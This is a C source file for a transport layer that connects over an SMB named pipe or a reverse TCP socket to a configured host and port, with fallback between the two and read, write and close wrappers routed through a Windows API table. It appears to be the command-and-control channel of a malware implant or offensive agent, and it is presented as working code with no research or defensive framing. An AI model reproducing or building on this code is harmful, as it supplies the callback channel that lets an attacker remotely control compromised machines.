#include "sq_transport.h"

#define SQ_NAMED_PIPE_WAIT_MS 3000u

static sq_u16 SqHostToNetwork16(sq_u16 value) {
    return (sq_u16)(((value & 0x00ffu) << 8) | ((value & 0xff00u) >> 8));
}

static enum sq_status SqTransportConnectNamedPipe(
    struct sq_transport *transport,
    struct sq_winapi *api,
    const struct sq_transport_config *config) {
    HANDLE pipe;
    enum sq_status status;

    if (transport == SQ_NULL || api == SQ_NULL || config == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    status = SqWinApiCreateFileW(
        api,
        config->named_pipe,
        GENERIC_READ | GENERIC_WRITE,
        0,
        SQ_NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        SQ_NULL,
        &pipe);
    if (status != SqStatusSuccess) {
        (void)SqWinApiWaitNamedPipeW(api, config->named_pipe, SQ_NAMED_PIPE_WAIT_MS);
        status = SqWinApiCreateFileW(
            api,
            config->named_pipe,
            GENERIC_READ | GENERIC_WRITE,
            0,
            SQ_NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            SQ_NULL,
            &pipe);
    }

    if (status != SqStatusSuccess) {
        return status;
    }

    transport->kind = SQ_TRANSPORT_KIND_SMB_NAMED_PIPE;
    transport->pipe = pipe;
    transport->socket_value = INVALID_SOCKET;
    return SqStatusSuccess;
}

static enum sq_status SqTransportConnectReverseTcp(
    struct sq_transport *transport,
    struct sq_winapi *api,
    const struct sq_transport_config *config) {
    SOCKET socket_value;
    struct sockaddr_in address;
    enum sq_status status;

    if (transport == SQ_NULL || api == SQ_NULL || config == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    status = SqWinApiWSAStartup(api);
    if (status != SqStatusSuccess) {
        return status;
    }

    status = SqWinApiSocket(api, AF_INET, SOCK_STREAM, IPPROTO_TCP, &socket_value);
    if (status != SqStatusSuccess) {
        return status;
    }

    SqZeroMemory(&address, (sq_u32)sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = SqHostToNetwork16(config->reverse_tcp_port);
    address.sin_addr.S_un.S_un_b.s_b1 = config->reverse_tcp_host[0];
    address.sin_addr.S_un.S_un_b.s_b2 = config->reverse_tcp_host[1];
    address.sin_addr.S_un.S_un_b.s_b3 = config->reverse_tcp_host[2];
    address.sin_addr.S_un.S_un_b.s_b4 = config->reverse_tcp_host[3];

    status = SqWinApiConnect(
        api,
        socket_value,
        (const struct sockaddr *)&address,
        (int)sizeof(address));
    if (status != SqStatusSuccess) {
        (void)SqWinApiCloseSocket(api, socket_value);
        return status;
    }

    transport->kind = SQ_TRANSPORT_KIND_REVERSE_TCP;
    transport->pipe = INVALID_HANDLE_VALUE;
    transport->socket_value = socket_value;
    return SqStatusSuccess;
}

enum sq_status SqTransportInitialize(struct sq_transport *transport) {
    if (transport == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    SqZeroMemory(transport, (sq_u32)sizeof(*transport));
    transport->pipe = INVALID_HANDLE_VALUE;
    transport->socket_value = INVALID_SOCKET;
    return SqStatusSuccess;
}

enum sq_status SqTransportConnect(
    struct sq_transport *transport,
    struct sq_winapi *api,
    const struct sq_transport_config *config) {
    enum sq_status status;

    if (transport == SQ_NULL || api == SQ_NULL || config == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    status = SqTransportInitialize(transport);
    if (status != SqStatusSuccess) {
        return status;
    }

    if (config->kind == SQ_TRANSPORT_KIND_SMB_NAMED_PIPE) {
        return SqTransportConnectNamedPipe(transport, api, config);
    }

    if (config->kind == SQ_TRANSPORT_KIND_REVERSE_TCP) {
        return SqTransportConnectReverseTcp(transport, api, config);
    }

    status = SqTransportConnectNamedPipe(transport, api, config);
    if (status == SqStatusSuccess) {
        return status;
    }

    return SqTransportConnectReverseTcp(transport, api, config);
}

enum sq_status SqTransportSend(
    struct sq_transport *transport,
    struct sq_winapi *api,
    const void *buffer,
    sq_u32 length,
    sq_u32 *bytes_sent) {
    if (transport == SQ_NULL || api == SQ_NULL || buffer == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    if (transport->kind == SQ_TRANSPORT_KIND_SMB_NAMED_PIPE) {
        return SqWinApiWriteFile(api, transport->pipe, buffer, length, bytes_sent);
    }

    if (transport->kind == SQ_TRANSPORT_KIND_REVERSE_TCP) {
        return SqWinApiSend(api, transport->socket_value, buffer, length, bytes_sent);
    }

    return SqStatusInvalidParameter;
}

enum sq_status SqTransportReceive(
    struct sq_transport *transport,
    struct sq_winapi *api,
    void *buffer,
    sq_u32 length,
    sq_u32 *bytes_received) {
    if (transport == SQ_NULL || api == SQ_NULL || buffer == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    if (transport->kind == SQ_TRANSPORT_KIND_SMB_NAMED_PIPE) {
        return SqWinApiReadFile(api, transport->pipe, buffer, length, bytes_received);
    }

    if (transport->kind == SQ_TRANSPORT_KIND_REVERSE_TCP) {
        return SqWinApiRecv(api, transport->socket_value, buffer, length, bytes_received);
    }

    return SqStatusInvalidParameter;
}

enum sq_status SqTransportClose(
    struct sq_transport *transport,
    struct sq_winapi *api) {
    enum sq_status status;

    if (transport == SQ_NULL || api == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    status = SqStatusSuccess;
    if (transport->kind == SQ_TRANSPORT_KIND_SMB_NAMED_PIPE) {
        if (transport->pipe != SQ_NULL && transport->pipe != INVALID_HANDLE_VALUE) {
            status = SqWinApiCloseHandle(api, transport->pipe);
        }
    } else if (transport->kind == SQ_TRANSPORT_KIND_REVERSE_TCP) {
        if (transport->socket_value != INVALID_SOCKET) {
            status = SqWinApiCloseSocket(api, transport->socket_value);
        }
    }

    (void)SqTransportInitialize(transport);
    return status;
}
